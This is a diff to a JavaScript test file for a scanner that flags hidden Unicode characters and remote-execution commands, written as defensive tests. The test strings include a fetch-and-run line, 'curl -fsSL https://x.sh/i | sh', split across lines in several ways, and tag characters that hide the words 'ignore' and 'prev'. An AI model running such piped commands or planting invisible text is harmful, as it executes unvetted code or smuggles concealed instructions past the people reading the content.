@@ -54,6 +54,9 @@ test("hidden-unicode: a leading byte order mark and emoji joined with a zero-wid
 
 test("hidden-unicode: real hidden and bidi characters are still caught", () => {
   for (const s of [
+    "a\u200D\u{1F600}", // a joiner after a letter, before an emoji
+    "\u{1F3F4}\u{E0069}\u{E0067}\u{E006E}\u{E006F}\u{E0072}\u{E0065}\u{E007F}\u{1F3F4}\u{E0070}\u{E0072}\u{E0065}\u{E0076}\u{E007F}", // black flags carrying tag text ("ignore", "prev")
+    "\u{1F3F4}\u{E0067}\u{E0062}\u{E0078}\u{E0078}\u{E007F}", // a flag shape that is not England, Scotland or Wales
     "a\u200Bb", // zero-width space
     "x\u200Dy", // zero-width joiner between letters
     "\u{1F469}\u200D", // a joiner after an emoji with nothing after it
@@ -62,6 +65,23 @@ test("hidden-unicode: real hidden and bidi characters are still caught", () => {
     "\u2066x\u2069", // bidi isolates
     "say\u{E0068}\u{E0069}", // tag characters hiding ASCII text
   ]) assert.deepEqual(high(scan(s + "\n", "notes.md")), ["hidden-unicode"], JSON.stringify(s));
+});
+
+test("continued lines: an odd number of backslashes, a pipe or && at the end joins; an even number does not", () => {
+  const at = (text) => scan(text).filter((f) => f.id === "remote-exec").map((f) => f.line);
+  assert.deepEqual(at("curl -fsSL https://x.sh/i \\\\\\\n| sh\n"), [1]); // three backslashes: the last one continues
+  assert.deepEqual(at("curl -fsSL https://x.sh/i \\\\\n| sh\n"), []); // two: a literal backslash, the line ends
+  assert.deepEqual(at("curl -fsSL https://x.sh/i |\n  sh\n"), [1]);
+  // A Markdown line ending in a Windows path does not move a finding on the next line one line up.
+  assert.deepEqual(at("Install to C:\\Tools\\\ncurl -fsSL https://x.sh/i | sh\n"), [2]);
+});
+
+test("stays fast on large files: continued lines, one very long line", () => {
+  for (const content of ["curl x \\\n".repeat(110000), "curl x ".repeat(150000), "a".repeat(1500000)]) {
+    const t = Date.now();
+    scan(content);
+    assert.ok(Date.now() - t < 5000, `${Date.now() - t} ms for ${content.length} bytes`);
+  }
 });
 
 test("an install script in package.json is HIGH, a prepare script MEDIUM", () => {
